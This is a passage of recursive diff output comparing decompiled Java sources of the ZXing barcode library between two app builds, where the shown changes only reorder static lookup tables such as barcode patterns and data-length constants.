+<     Object localObject22 = new Integer(30);
+<     Object localObject23 = VARIABLE_LENGTH;
+<     Object localObject24 = new Integer(30);
+<     Object localObject33 = { "99", VARIABLE_LENGTH, new Integer(30) };
+<     TWO_DIGIT_DATA_LENGTH = new Object[][] { { "00", localObject1 }, localObject25, localObject26, { "10", localObject2, localObject3 }, { "11", localInteger1 }, { "12", localInteger2 }, { "13", localObject4 }, localObject27, localObject28, localObject29, { "21", localObject5, localObject6 }, { "22", localObject7, localObject8 }, localObject30, localObject31, localObject32, { "91", localObject9, localObject10 }, { "92", localObject11, localObject12 }, { "93", localObject13, localObject14 }, { "94", localObject15, localObject16 }, { "95", localObject17, localObject18 }, { "96", localObject19, localObject20 }, { "97", localObject21, localObject22 }, { "98", localObject23, localObject24 }, localObject33 };
+<     localObject6 = new Object[] { "240", VARIABLE_LENGTH, new Integer(30) };
+<     localObject7 = new Object[] { "241", VARIABLE_LENGTH, new Integer(30) };
+<     localObject8 = new Object[] { "242", VARIABLE_LENGTH, new Integer(6) };
+<     localObject9 = new Object[] { "250", VARIABLE_LENGTH, new Integer(30) };
+---
+>     Object localObject8 = new Integer(30);
+>     Object localObject23 = { "96", VARIABLE_LENGTH, new Integer(30) };
+>     Object localObject24 = { "97", VARIABLE_LENGTH, new Integer(30) };
+>     Object localObject25 = { "98", VARIABLE_LENGTH, new Integer(30) };
+>     Object localObject26 = { "99", VARIABLE_LENGTH, new Integer(30) };
+>     TWO_DIGIT_DATA_LENGTH = new Object[][] { localObject9, localObject10, localObject11, { "10", localObject1, localObject2 }, localObject12, localObject13, localObject14, { "15", localInteger1 }, { "17", localInteger2 }, localObject15, localObject16, localObject17, localObject18, { "37", localObject3, localObject4 }, localObject19, localObject20, localObject21, { "93", localObject5, localObject6 }, localObject22, { "95", localObject7, localObject8 }, localObject23, localObject24, localObject25, localObject26 };
+>     localObject3 = new Object[] { "240", VARIABLE_LENGTH, new Integer(30) };
+>     localObject4 = new Object[] { "241", VARIABLE_LENGTH, new Integer(30) };
+>     localObject5 = new Object[] { "242", VARIABLE_LENGTH, new Integer(6) };
+>     localObject6 = new Object[] { "250", VARIABLE_LENGTH, new Integer(30) };
+>     localObject7 = new Object[] { "251", VARIABLE_LENGTH, new Integer(30) };
+>     localObject8 = new Object[] { "253", VARIABLE_LENGTH, new Integer(17) };
+>     localObject9 = new Object[] { "254", VARIABLE_LENGTH, new Integer(20) };
+>     localObject10 = new Object[] { "400", VARIABLE_LENGTH, new Integer(30) };
+>     localObject11 = new Object[] { "401", VARIABLE_LENGTH, new Integer(30) };
+>     localObject12 = new Object[] { "402", new Integer(17) };
+57,77c56,68
+<     localObject3 = VARIABLE_LENGTH;
+<     localInteger1 = new Integer(17);
+<     localObject10 = new Object[] { "254", VARIABLE_LENGTH, new Integer(20) };
+<     localObject11 = new Object[] { "400", VARIABLE_LENGTH, new Integer(30) };
+<     localObject12 = new Object[] { "401", VARIABLE_LENGTH, new Integer(30) };
+<     localObject13 = new Object[] { "402", new Integer(17) };
+<     localObject14 = new Object[] { "403", VARIABLE_LENGTH, new Integer(30) };
+<     localInteger2 = new Integer(13);
+<     localObject15 = new Object[] { "411", new Integer(13) };
+<     localObject16 = new Object[] { "412", new Integer(13) };
+<     localObject17 = new Object[] { "413", new Integer(13) };
+<     localObject18 = new Object[] { "414", new Integer(13) };
+<     localObject19 = new Object[] { "420", VARIABLE_LENGTH, new Integer(20) };
+<     localObject4 = VARIABLE_LENGTH;
+<     localObject5 = new Integer(15);
+<     localObject20 = new Object[] { "422", new Integer(3) };
+<     localObject21 = new Object[] { "423", VARIABLE_LENGTH, new Integer(15) };
+<     localObject22 = new Object[] { "424", new Integer(3) };
+<     localObject23 = new Object[] { "425", new Integer(3) };
+<     localObject24 = new Object[] { "426", new Integer(3) };
+<     THREE_DIGIT_DATA_LENGTH = new Object[][] { localObject6, localObject7, localObject8, localObject9, { "251", localObject1, localObject2 }, { "253", localObject3, localInteger1 }, localObject10, localObject11, localObject12, localObject13, localObject14, { "410", localInteger2 }, localObject15, localObject16, localObject17, localObject18, localObject19, { "421", localObject4, localObject5 }, localObject20, localObject21, localObject22, localObject23, localObject24 };
+---
+>     localObject13 = new Object[] { "410", new Integer(13) };
+>     localObject14 = new Object[] { "411", new Integer(13) };
+>     localInteger1 = new Integer(13);
+>     localObject15 = new Object[] { "413", new Integer(13) };
+>     localObject16 = new Object[] { "414", new Integer(13) };
+>     localObject17 = new Object[] { "420", VARIABLE_LENGTH, new Integer(20) };
+>     localObject18 = new Object[] { "421", VARIABLE_LENGTH, new Integer(15) };
+>     localObject19 = new Object[] { "422", new Integer(3) };
+>     localObject20 = new Object[] { "423", VARIABLE_LENGTH, new Integer(15) };
+>     localObject21 = new Object[] { "424", new Integer(3) };
+>     localInteger2 = new Integer(3);
+>     localObject22 = new Object[] { "426", new Integer(3) };
+>     THREE_DIGIT_DATA_LENGTH = new Object[][] { localObject3, localObject4, localObject5, localObject6, localObject7, localObject8, localObject9, localObject10, localObject11, localObject12, { "403", localObject1, localObject2 }, localObject13, localObject14, { "412", localInteger1 }, localObject15, localObject16, localObject17, localObject18, localObject19, localObject20, localObject21, { "425", localInteger2 }, localObject22 };
+79d69
+<     Object[] arrayOfObject1 = { "311", new Integer(6) };
+81,83d70
+<     Object[] arrayOfObject2 = { "313", new Integer(6) };
+<     Object[] arrayOfObject3 = { "314", new Integer(6) };
+<     localObject3 = new Integer(6);
+85a73
+>     localObject3 = new Integer(6);
+87a76
+>     Object[] arrayOfObject1 = { "320", new Integer(6) };
+91a81
+>     Object[] arrayOfObject2 = { "325", new Integer(6) };
+92a83,84
+>     Object[] arrayOfObject3 = { "327", new Integer(6) };
+>     Object[] arrayOfObject4 = { "328", new Integer(6) };
+94a87
+>     Object[] arrayOfObject5 = { "331", new Integer(6) };
+97a91,92
+>     Object[] arrayOfObject6 = { "335", new Integer(6) };
+>     Object[] arrayOfObject7 = { "336", new Integer(6) };
+99c94,95
+<     Object[] arrayOfObject4 = { "334", new Integer(6) };
+---
+>     Object[] arrayOfObject8 = { "341", new Integer(6) };
+>     Object[] arrayOfObject9 = { "342", new Integer(6) };
+100a97
+>     Object[] arrayOfObject10 = { "344", new Integer(6) };
+104d100
+<     Object[] arrayOfObject5 = { "342", new Integer(6) };
+107a104
+>     Object[] arrayOfObject11 = { "351", new Integer(6) };
+109a107,108
+>     Object[] arrayOfObject12 = { "354", new Integer(6) };
+>     Object[] arrayOfObject13 = { "355", new Integer(6) };
+111,117c110
+<     localObject27 = new Integer(6);
+<     localObject28 = new Integer(6);
+<     localObject29 = new Integer(6);
+<     localObject30 = new Integer(6);
+<     localObject31 = new Integer(6);
+<     localObject32 = new Integer(6);
+<     localObject33 = new Integer(6);
+---
+>     Object[] arrayOfObject14 = { "357", new Integer(6) };
+119a113,114
+>     Object[] arrayOfObject15 = { "362", new Integer(6) };
+>     Object[] arrayOfObject16 = { "363", new Integer(6) };
+121c116,117
+<     Object[] arrayOfObject6 = { "361", new Integer(6) };
+---
+>     Object[] arrayOfObject17 = { "365", new Integer(6) };
+>     Object[] arrayOfObject18 = { "366", new Integer(6) };
+125,139c121,131
+<     Integer localInteger9 = new Integer(6);
+<     Integer localInteger10 = new Integer(6);
+<     Object[] arrayOfObject7 = { "367", new Integer(6) };
+<     Object[] arrayOfObject8 = { "368", new Integer(6) };
+<     Integer localInteger11 = new Integer(6);
+<     Object localObject34 = VARIABLE_LENGTH;
+<     Integer localInteger12 = new Integer(15);
+<     Object localObject35 = VARIABLE_LENGTH;
+<     Integer localInteger13 = new Integer(18);
+<     Object[] arrayOfObject9 = { "392", VARIABLE_LENGTH, new Integer(15) };
+<     Object localObject36 = VARIABLE_LENGTH;
+<     Integer localInteger14 = new Integer(18);
+<     Object localObject37 = VARIABLE_LENGTH;
+<     Integer localInteger15 = new Integer(30);
+<     THREE_DIGIT_PLUS_DIGIT_DATA_LENGTH = new Object[][] { { "310", localObject1 }, arrayOfObject1, { "312", localObject2 }, arrayOfObject2, arrayOfObject3, { "315", localObject3 }, { "316", localInteger1 }, { "320", localInteger2 }, { "321", localObject4 }, { "322", localObject5 }, { "323", localObject6 }, { "324", localObject7 }, { "325", localObject8 }, { "326", localObject9 }, { "327", localObject10 }, { "328", localObject11 }, { "329", localObject12 }, { "330", localObject13 }, { "331", localObject14 }, { "332", localObject15 }, { "333", localObject16 }, arrayOfObject4, { "335", localObject17 }, { "336", localObject18 }, { "340", localObject19 }, { "341", localObject20 }, arrayOfObject5, { "343", localObject21 }, { "344", localObject22 }, { "345", localObject23 }, { "346", localObject24 }, { "347", localObject25 }, { "348", localObject26 }, { "349", localObject27 }, { "350", localObject28 }, { "351", localObject29 }, { "352", localObject30 }, { "353", localObject31 }, { "354", localObject32 }, { "355", localObject33 }, { "356", localInteger3 }, { "357", localInteger4 }, { "360", localInteger5 }, arrayOfObject6, { "362", localInteger6 }, { "363", localInteger7 }, { "364", localInteger8 }, { "365", localInteger9 }, { "366", localInteger10 }, arrayOfObject7, arrayOfObject8, { "369", localInteger11 }, { "390", localObject34, localInteger12 }, { "391", localObject35, localInteger13 }, arrayOfObject9, { "393", localObject36, localInteger14 }, { "703", localObject37, localInteger15 } };
+---
+>     Object localObject27 = VARIABLE_LENGTH;
+>     Integer localInteger9 = new Integer(15);
+>     Object localObject28 = VARIABLE_LENGTH;
+>     Integer localInteger10 = new Integer(18);
+>     Object localObject29 = VARIABLE_LENGTH;
+>     Integer localInteger11 = new Integer(15);
+>     Object localObject30 = VARIABLE_LENGTH;
+>     Integer localInteger12 = new Integer(18);
+>     Object localObject31 = VARIABLE_LENGTH;
+>     Integer localInteger13 = new Integer(30);
+>     THREE_DIGIT_PLUS_DIGIT_DATA_LENGTH = new Object[][] { { "310", localObject1 }, { "311", localObject2 }, { "312", localInteger1 }, { "313", localInteger2 }, { "314", localObject3 }, { "315", localObject4 }, { "316", localObject5 }, arrayOfObject1, { "321", localObject6 }, { "322", localObject7 }, { "323", localObject8 }, { "324", localObject9 }, arrayOfObject2, { "326", localObject10 }, arrayOfObject3, arrayOfObject4, { "329", localObject11 }, { "330", localObject12 }, arrayOfObject5, { "332", localObject13 }, { "333", localObject14 }, { "334", localObject15 }, arrayOfObject6, arrayOfObject7, { "340", localObject16 }, arrayOfObject8, arrayOfObject9, { "343", localObject17 }, arrayOfObject10, { "345", localObject18 }, { "346", localObject19 }, { "347", localObject20 }, { "348", localObject21 }, { "349", localObject22 }, { "350", localObject23 }, arrayOfObject11, { "352", localObject24 }, { "353", localObject25 }, arrayOfObject12, arrayOfObject13, { "356", localObject26 }, arrayOfObject14, { "360", localInteger3 }, { "361", localInteger4 }, arrayOfObject15, arrayOfObject16, { "364", localInteger5 }, arrayOfObject17, arrayOfObject18, { "367", localInteger6 }, { "368", localInteger7 }, { "369", localInteger8 }, { "390", localObject27, localInteger9 }, { "391", localObject28, localInteger10 }, { "392", localObject29, localInteger11 }, { "393", localObject30, localInteger12 }, { "703", localObject31, localInteger13 } };
+142,147c134,141
+<     localObject3 = new Integer(30);
+<     localInteger1 = new Integer(10);
+<     localInteger2 = new Integer(14);
+<     localObject4 = VARIABLE_LENGTH;
+<     localObject5 = new Integer(20);
+<     localObject19 = new Object[] { "8003", VARIABLE_LENGTH, new Integer(30) };
+---
+>     localInteger1 = new Integer(30);
+>     localInteger2 = new Integer(10);
+>     localObject3 = new Integer(14);
+>     localObject13 = new Object[] { "8002", VARIABLE_LENGTH, new Integer(20) };
+>     localObject14 = new Object[] { "8003", VARIABLE_LENGTH, new Integer(30) };
+>     localObject15 = new Object[] { "8004", VARIABLE_LENGTH, new Integer(30) };
+>     localObject4 = new Integer(6);
+>     localObject5 = new Integer(18);
+150,153c144,150
+<     localObject8 = new Integer(6);
+<     localObject20 = new Object[] { "8006", new Integer(18) };
+<     localObject9 = VARIABLE_LENGTH;
+<     localObject10 = new Integer(30);
+---
+>     localObject8 = VARIABLE_LENGTH;
+>     localObject9 = new Integer(12);
+>     localObject16 = new Object[] { "8018", new Integer(18) };
+>     localObject17 = new Object[] { "8020", VARIABLE_LENGTH, new Integer(25) };
+>     localObject18 = new Object[] { "8100", new Integer(6) };
+>     localObject19 = new Object[] { "8101", new Integer(10) };
+>     localObject10 = new Integer(2);
+155,163c152,153
+<     localObject12 = new Integer(12);
+<     localObject13 = new Integer(18);
+<     localObject14 = VARIABLE_LENGTH;
+<     localObject15 = new Integer(25);
+<     localObject16 = new Integer(6);
+<     localObject17 = new Integer(10);
+<     localObject18 = new Integer(2);
+<     localObject21 = new Object[] { "8110", VARIABLE_LENGTH, new Integer(30) };
+<     FOUR_DIGIT_DATA_LENGTH = new Object[][] { { "7001", localObject1 }, { "7002", localObject2, localObject3 }, { "7003", localInteger1 }, { "8001", localInteger2 }, { "8002", localObject4, localObject5 }, localObject19, { "8004", localObject6, localObject7 }, { "8005", localObject8 }, localObject20, { "8007", localObject9, localObject10 }, { "8008", localObject11, localObject12 }, { "8018", localObject13 }, { "8020", localObject14, localObject15 }, { "8100", localObject16 }, { "8101", localObject17 }, { "8102", localObject18 }, localObject21 };
+---
+>     localObject12 = new Integer(30);
+>     FOUR_DIGIT_DATA_LENGTH = new Object[][] { { "7001", localObject1 }, { "7002", localObject2, localInteger1 }, { "7003", localInteger2 }, { "8001", localObject3 }, localObject13, localObject14, localObject15, { "8005", localObject4 }, { "8006", localObject5 }, { "8007", localObject6, localObject7 }, { "8008", localObject8, localObject9 }, localObject16, localObject17, localObject18, localObject19, { "8102", localObject10 }, { "8110", localObject11, localObject12 } };
+diff -r result/APP_101/App_B_101/com/google/zxing/oned/rss/expanded/RSSExpandedReader.java result/APP_101/App_M_101/com/google/zxing/oned/rss/expanded/RSSExpandedReader.java
+42,43c42,43
+<     int[] arrayOfInt1 = { 1, 3, 9, 27, 81, 32, 96, 77 };
+<     int[] arrayOfInt2 = { 62, 186, 136, 197, 169, 85, 44, 132 };
+---
+>     int[] arrayOfInt1 = { 189, 145, 13, 39, 117, 140, 209, 205 };
+>     int[] arrayOfInt2 = { 113, 128, 173, 97, 80, 29, 87, 50 };
+45,53c45,63
+<     int[] arrayOfInt4 = { 70, 210, 208, 202, 184, 130, 179, 115 };
+<     int[] arrayOfInt5 = { 120, 149, 25, 75, 14, 42, 126, 167 };
+<     WEIGHTS = new int[][] { arrayOfInt1, { 20, 60, 180, 118, 143, 7, 21, 63 }, { 189, 145, 13, 39, 117, 140, 209, 205 }, { 193, 157, 49, 147, 19, 57, 171, 91 }, arrayOfInt2, { 185, 133, 188, 142, 4, 12, 36, 108 }, { 113, 128, 173, 97, 80, 29, 87, 50 }, arrayOfInt3, { 46, 138, 203, 187, 139, 206, 196, 166 }, { 76, 17, 51, 153, 37, 111, 122, 155 }, { 43, 129, 176, 106, 107, 110, 119, 146 }, { 16, 48, 144, 10, 30, 90, 59, 177 }, { 109, 116, 137, 200, 178, 112, 125, 164 }, arrayOfInt4, { 134, 191, 151, 31, 93, 68, 204, 190 }, { 148, 22, 66, 198, 172, 94, 71, 2 }, { 6, 18, 54, 162, 64, 192, 154, 40 }, arrayOfInt5, { 79, 26, 78, 23, 69, 207, 199, 175 }, { 103, 98, 83, 38, 114, 131, 182, 124 }, { 161, 61, 183, 127, 170, 88, 53, 159 }, { 55, 165, 73, 8, 24, 72, 5, 15 }, { 45, 135, 194, 160, 58, 174, 100, 89 } };
+<     arrayOfInt1 = new int[] { 0, 2, 1, 3 };
+<     arrayOfInt2 = new int[] { 0, 4, 1, 3, 2 };
+<     arrayOfInt3 = new int[] { 0, 0, 1, 1, 2, 2, 3, 3 };
+<     arrayOfInt4 = new int[] { 0, 0, 1, 1, 2, 2, 3, 4, 5, 5 };
+<     arrayOfInt5 = new int[] { 0, 0, 1, 1, 2, 3, 3, 4, 4, 5, 5 };
+<     FINDER_PATTERN_SEQUENCES = new int[][] { { 0, 0 }, { 0, 1, 1 }, arrayOfInt1, arrayOfInt2, { 0, 4, 1, 3, 3, 5 }, { 0, 4, 1, 3, 4, 5, 5 }, arrayOfInt3, { 0, 0, 1, 1, 2, 2, 3, 4, 4 }, arrayOfInt4, arrayOfInt5 };
+---
+>     int[] arrayOfInt4 = { 46, 138, 203, 187, 139, 206, 196, 166 };
+>     int[] arrayOfInt5 = { 43, 129, 176, 106, 107, 110, 119, 146 };
+>     int[] arrayOfInt6 = { 16, 48, 144, 10, 30, 90, 59, 177 };
+>     int[] arrayOfInt7 = { 109, 116, 137, 200, 178, 112, 125, 164 };
+>     int[] arrayOfInt8 = { 134, 191, 151, 31, 93, 68, 204, 190 };
+>     int[] arrayOfInt9 = { 79, 26, 78, 23, 69, 207, 199, 175 };
+>     int[] arrayOfInt10 = { 103, 98, 83, 38, 114, 131, 182, 124 };
+>     int[] arrayOfInt11 = { 161, 61, 183, 127, 170, 88, 53, 159 };
+>     int[] arrayOfInt12 = { 55, 165, 73, 8, 24, 72, 5, 15 };
+>     WEIGHTS = new int[][] { { 1, 3, 9, 27, 81, 32, 96, 77 }, { 20, 60, 180, 118, 143, 7, 21, 63 }, arrayOfInt1, { 193, 157, 49, 147, 19, 57, 171, 91 }, { 62, 186, 136, 197, 169, 85, 44, 132 }, { 185, 133, 188, 142, 4, 12, 36, 108 }, arrayOfInt2, arrayOfInt3, arrayOfInt4, { 76, 17, 51, 153, 37, 111, 122, 155 }, arrayOfInt5, arrayOfInt6, arrayOfInt7, { 70, 210, 208, 202, 184, 130, 179, 115 }, arrayOfInt8, { 148, 22, 66, 198, 172, 94, 71, 2 }, { 6, 18, 54, 162, 64, 192, 154, 40 }, { 120, 149, 25, 75, 14, 42, 126, 167 }, arrayOfInt9, arrayOfInt10, arrayOfInt11, arrayOfInt12, { 45, 135, 194, 160, 58, 174, 100, 89 } };
+>     arrayOfInt1 = new int[] { 0, 0 };
+>     arrayOfInt2 = new int[] { 0, 1, 1 };
+>     arrayOfInt3 = new int[] { 0, 2, 1, 3 };
+>     arrayOfInt4 = new int[] { 0, 4, 1, 3, 2 };
+>     arrayOfInt5 = new int[] { 0, 4, 1, 3, 4, 5, 5 };
+>     arrayOfInt6 = new int[] { 0, 0, 1, 1, 2, 2, 3, 4, 4 };
+>     arrayOfInt7 = new int[] { 0, 0, 1, 1, 2, 2, 3, 4, 5, 5 };
+>     arrayOfInt8 = new int[] { 0, 0, 1, 1, 2, 3, 3, 4, 4, 5, 5 };
+>     FINDER_PATTERN_SEQUENCES = new int[][] { arrayOfInt1, arrayOfInt2, arrayOfInt3, arrayOfInt4, { 0, 4, 1, 3, 3, 5 }, arrayOfInt5, { 0, 0, 1, 1, 2, 2, 3, 3 }, arrayOfInt6, arrayOfInt7, arrayOfInt8 };
+diff -r result/APP_101/App_B_101/com/google/zxing/oned/rss/RSS14Reader.java result/APP_101/App_M_101/com/google/zxing/oned/rss/RSS14Reader.java
+34,37c34,40
+<     int[] arrayOfInt1 = { 2, 3, 8, 1 };
+<     int[] arrayOfInt2 = { 1, 5, 7, 1 };
+<     int[] arrayOfInt3 = { 1, 3, 9, 1 };
+<     FINDER_PATTERNS = new int[][] { { 3, 8, 2, 1 }, { 3, 5, 5, 1 }, { 3, 3, 7, 1 }, { 3, 1, 9, 1 }, { 2, 7, 4, 1 }, { 2, 5, 6, 1 }, arrayOfInt1, arrayOfInt2, arrayOfInt3 };
+---
+>     int[] arrayOfInt1 = { 3, 8, 2, 1 };
+>     int[] arrayOfInt2 = { 3, 5, 5, 1 };
+>     int[] arrayOfInt3 = { 3, 3, 7, 1 };
+>     int[] arrayOfInt4 = { 3, 1, 9, 1 };
+>     int[] arrayOfInt5 = { 2, 7, 4, 1 };
+>     int[] arrayOfInt6 = { 1, 5, 7, 1 };
+>     FINDER_PATTERNS = new int[][] { arrayOfInt1, arrayOfInt2, arrayOfInt3, arrayOfInt4, arrayOfInt5, { 2, 5, 6, 1 }, { 2, 3, 8, 1 }, arrayOfInt6, { 1, 3, 9, 1 } };
+diff -r result/APP_101/App_B_101/com/google/zxing/oned/UPCEANReader.java result/APP_101/App_M_101/com/google/zxing/oned/UPCEANReader.java
+32c32,37
+<     L_PATTERNS = new int[][] { { 3, 2, 1, 1 }, { 2, 2, 2, 1 }, { 2, 1, 2, 2 }, { 1, 4, 1, 1 }, { 1, 1, 3, 2 }, { 1, 2, 3, 1 }, { 1, 1, 1, 4 }, { 1, 3, 1, 2 }, { 1, 2, 1, 3 }, { 3, 1, 1, 2 } };
+---
+>     int[] arrayOfInt1 = { 2, 1, 2, 2 };
+>     int[] arrayOfInt2 = { 1, 4, 1, 1 };
+>     int[] arrayOfInt3 = { 1, 2, 3, 1 };
+>     int[] arrayOfInt4 = { 1, 1, 1, 4 };
+>     int[] arrayOfInt5 = { 3, 1, 1, 2 };
+>     L_PATTERNS = new int[][] { { 3, 2, 1, 1 }, { 2, 2, 2, 1 }, arrayOfInt1, arrayOfInt2, { 1, 1, 3, 2 }, arrayOfInt3, arrayOfInt4, { 1, 3, 1, 2 }, { 1, 2, 1, 3 }, arrayOfInt5 };
+43,44c48,49
+<       int[] arrayOfInt1 = L_PATTERNS[(i - 10)];
+<       int[] arrayOfInt2 = new int[arrayOfInt1.length];
+---
+>       arrayOfInt1 = L_PATTERNS[(i - 10)];
+>       arrayOfInt2 = new int[arrayOfInt1.length];
+diff -r result/APP_101/App_B_101/com/google/zxing/qrcode/decoder/FormatInformation.java result/APP_101/App_M_101/com/google/zxing/qrcode/decoder/FormatInformation.java
+13,29c13,14
+<     int[] arrayOfInt1 = { 20773, 1 };
+<     int[] arrayOfInt2 = { 24188, 2 };
+<     int[] arrayOfInt3 = { 16590, 5 };
+<     int[] arrayOfInt4 = { 20375, 6 };
+<     int[] arrayOfInt5 = { 30660, 8 };
+<     int[] arrayOfInt6 = { 29427, 9 };
+<     int[] arrayOfInt7 = { 32170, 10 };
+<     int[] arrayOfInt8 = { 30877, 11 };
+<     int[] arrayOfInt9 = { 26998, 15 };
+<     int[] arrayOfInt10 = { 5769, 16 };
+<     int[] arrayOfInt11 = { 1890, 20 };
+<     int[] arrayOfInt12 = { 3340, 22 };
+<     int[] arrayOfInt13 = { 2107, 23 };
+<     int[] arrayOfInt14 = { 16177, 26 };
+<     int[] arrayOfInt15 = { 9396, 28 };
+<     int[] arrayOfInt16 = { 11994, 30 };
+<     FORMAT_INFO_DECODE_LOOKUP = new int[][] { { 21522, 0 }, arrayOfInt1, arrayOfInt2, { 23371, 3 }, { 17913, 4 }, arrayOfInt3, arrayOfInt4, { 19104, 7 }, arrayOfInt5, arrayOfInt6, arrayOfInt7, arrayOfInt8, { 26159, 12 }, { 25368, 13 }, { 27713, 14 }, arrayOfInt9, arrayOfInt10, { 5054, 17 }, { 7399, 18 }, { 6608, 19 }, arrayOfInt11, { 597, 21 }, arrayOfInt12, arrayOfInt13, { 13663, 24 }, { 12392, 25 }, arrayOfInt14, { 14854, 27 }, arrayOfInt15, { 8579, 29 }, arrayOfInt16, { 11245, 31 } };
+---
+>     int[] arrayOfInt = { 13663, 24 };
+>     FORMAT_INFO_DECODE_LOOKUP = new int[][] { { 21522, 0 }, { 20773, 1 }, { 24188, 2 }, { 23371, 3 }, { 17913, 4 }, { 16590, 5 }, { 20375, 6 }, { 19104, 7 }, { 30660, 8 }, { 29427, 9 }, { 32170, 10 }, { 30877, 11 }, { 26159, 12 }, { 25368, 13 }, { 27713, 14 }, { 26998, 15 }, { 5769, 16 }, { 5054, 17 }, { 7399, 18 }, { 6608, 19 }, { 1890, 20 }, { 597, 21 }, { 3340, 22 }, { 2107, 23 }, arrayOfInt, { 12392, 25 }, { 16177, 26 }, { 14854, 27 }, { 9396, 28 }, { 8579, 29 }, { 11994, 30 }, { 11245, 31 } };
+diff -r result/APP_101/App_B_101/com/google/zxing/qrcode/encoder/MatrixUtil.java result/APP_101/App_M_101/com/google/zxing/qrcode/encoder/MatrixUtil.java
+12c12
+<   private static final int[][] POSITION_DETECTION_PATTERN = { { 1, 1, 1, 1, 1, 1, 1 }, { 1, 0, 0, 0, 0, 0, 1 }, { 1, 0, 1, 1, 1, 0, 1 }, { 1, 0, 1, 1, 1, 0, 1 }, { 1, 0, 1, 1, 1, 0, 1 }, { 1, 0, 0, 0, 0, 0, 1 }, { 1, 1, 1, 1, 1, 1, 1 } };
+---
+>   private static final int[][] POSITION_DETECTION_PATTERN;
+20a21,23
+>     int[] arrayOfInt1 = { 1, 0, 0, 0, 0, 0, 1 };
+>     int[] arrayOfInt2 = { 1, 0, 1, 1, 1, 0, 1 };
+>     POSITION_DETECTION_PATTERN = new int[][] { { 1, 1, 1, 1, 1, 1, 1 }, arrayOfInt1, arrayOfInt2, { 1, 0, 1, 1, 1, 0, 1 }, { 1, 0, 1, 1, 1, 0, 1 }, { 1, 0, 0, 0, 0, 0, 1 }, { 1, 1, 1, 1, 1, 1, 1 } };
+22,25c25,27
+<     int[] arrayOfInt1 = { 0 };
+<     int[] arrayOfInt2 = { 0 };
+<     VERTICAL_SEPARATION_PATTERN = new int[][] { { 0 }, arrayOfInt1, { 0 }, arrayOfInt2, { 0 }, { 0 }, { 0 } };
+<     POSITION_ADJUSTMENT_PATTERN = new int[][] { { 1, 1, 1, 1, 1 }, { 1, 0, 0, 0, 1 }, { 1, 0, 1, 0, 1 }, { 1, 0, 0, 0, 1 }, { 1, 1, 1, 1, 1 } };
+---
+>     VERTICAL_SEPARATION_PATTERN = new int[][] { { 0 }, { 0 }, { 0 }, { 0 }, { 0 }, { 0 }, { 0 } };
+>     arrayOfInt1 = new int[] { 1, 0, 0, 0, 1 };
+>     POSITION_ADJUSTMENT_PATTERN = new int[][] { { 1, 1, 1, 1, 1 }, arrayOfInt1, { 1, 0, 1, 0, 1 }, { 1, 0, 0, 0, 1 }, { 1, 1, 1, 1, 1 } };
+27,36c29,62
+<     arrayOfInt2 = new int[] { 6, 26, 46, -1, -1, -1, -1 };
+<     int[] arrayOfInt3 = { 6, 26, 50, 74, -1, -1, -1 };
+<     int[] arrayOfInt4 = { 6, 30, 58, 86, -1, -1, -1 };
+<     int[] arrayOfInt5 = { 6, 28, 54, 80, 106, -1, -1 };
+<     int[] arrayOfInt6 = { 6, 34, 62, 90, 118, -1, -1 };
+<     int[] arrayOfInt7 = { 6, 26, 52, 78, 104, 130, -1 };
+<     int[] arrayOfInt8 = { 6, 30, 56, 82, 108, 134, -1 };
+<     int[] arrayOfInt9 = { 6, 24, 50, 76, 102, 128, 154 };
+<     int[] arrayOfInt10 = { 6, 30, 58, 86, 114, 142, 170 };
+<     POSITION_ADJUSTMENT_PATTERN_COORDINATE_TABLE = new int[][] { arrayOfInt1, { 6, 18, -1, -1, -1, -1, -1 }, { 6, 22, -1, -1, -1, -1, -1 }, { 6, 26, -1, -1, -1, -1, -1 }, { 6, 30, -1, -1, -1, -1, -1 }, { 6, 34, -1, -1, -1, -1, -1 }, { 6, 22, 38, -1, -1, -1, -1 }, { 6, 24, 42, -1, -1, -1, -1 }, arrayOfInt2, { 6, 28, 50, -1, -1, -1, -1 }, { 6, 30, 54, -1, -1, -1, -1 }, { 6, 32, 58, -1, -1, -1, -1 }, { 6, 34, 62, -1, -1, -1, -1 }, { 6, 26, 46, 66, -1, -1, -1 }, { 6, 26, 48, 70, -1, -1, -1 }, arrayOfInt3, { 6, 30, 54, 78, -1, -1, -1 }, { 6, 30, 56, 82, -1, -1, -1 }, arrayOfInt4, { 6, 34, 62, 90, -1, -1, -1 }, { 6, 28, 50, 72, 94, -1, -1 }, { 6, 26, 50, 74, 98, -1, -1 }, { 6, 30, 54, 78, 102, -1, -1 }, arrayOfInt5, { 6, 32, 58, 84, 110, -1, -1 }, { 6, 30, 58, 86, 114, -1, -1 }, arrayOfInt6, { 6, 26, 50, 74, 98, 122, -1 }, { 6, 30, 54, 78, 102, 126, -1 }, arrayOfInt7, arrayOfInt8, { 6, 34, 60, 86, 112, 138, -1 }, { 6, 30, 58, 86, 114, 142, -1 }, { 6, 34, 62, 90, 118, 146, -1 }, { 6, 30, 54, 78, 102, 126, 150 }, arrayOfInt9, { 6, 28, 54, 80, 106, 132, 158 }, { 6, 32, 58, 84, 110, 136, 162 }, { 6, 26, 54, 82, 110, 138, 166 }, arrayOfInt10 };
+---
+>     arrayOfInt2 = new int[] { 6, 18, -1, -1, -1, -1, -1 };
+>     int[] arrayOfInt3 = { 6, 22, -1, -1, -1, -1, -1 };
+>     int[] arrayOfInt4 = { 6, 26, -1, -1, -1, -1, -1 };
+>     int[] arrayOfInt5 = { 6, 30, -1, -1, -1, -1, -1 };
+>     int[] arrayOfInt6 = { 6, 34, -1, -1, -1, -1, -1 };
+>     int[] arrayOfInt7 = { 6, 22, 38, -1, -1, -1, -1 };
+>     int[] arrayOfInt8 = { 6, 24, 42, -1, -1, -1, -1 };
+>     int[] arrayOfInt9 = { 6, 26, 46, -1, -1, -1, -1 };
+>     int[] arrayOfInt10 = { 6, 28, 50, -1, -1, -1, -1 };
+>     int[] arrayOfInt11 = { 6, 32, 58, -1, -1, -1, -1 };
+>     int[] arrayOfInt12 = { 6, 34, 62, -1, -1, -1, -1 };
+>     int[] arrayOfInt13 = { 6, 26, 46, 66, -1, -1, -1 };
+>     int[] arrayOfInt14 = { 6, 26, 48, 70, -1, -1, -1 };
+>     int[] arrayOfInt15 = { 6, 26, 50, 74, -1, -1, -1 };
+>     int[] arrayOfInt16 = { 6, 30, 56, 82, -1, -1, -1 };
+>     int[] arrayOfInt17 = { 6, 34, 62, 90, -1, -1, -1 };
+>     int[] arrayOfInt18 = { 6, 28, 50, 72, 94, -1, -1 };
+>     int[] arrayOfInt19 = { 6, 26, 50, 74, 98, -1, -1 };
+>     int[] arrayOfInt20 = { 6, 30, 54, 78, 102, -1, -1 };
